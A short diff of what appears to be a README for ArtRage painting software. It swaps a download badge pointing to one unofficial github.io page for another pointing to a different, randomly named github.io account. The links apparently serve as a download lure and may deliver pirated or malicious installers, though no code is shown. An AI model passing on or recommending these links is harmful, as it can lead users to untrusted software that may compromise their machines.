@@ -4,11 +4,7 @@
   <img src="https://www.artrage.com/wp-content/uploads/2021/08/ArtRage-NavBar.png" alt="ArtRage Painting Software"/>
 </p>
 
-<p align="center">
-  <a href="https://schinnergarett.github.io/.github/artrage-painting-software">
-    <img src="https://img.shields.io/badge/⬇️_Get_ArtRage-blue?style=for-the-badge&logo=github" alt="Get ArtRage"/>
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://lilbilqeeslilysl.github.io/.github/artrage-painting-software)
 
 ---
 
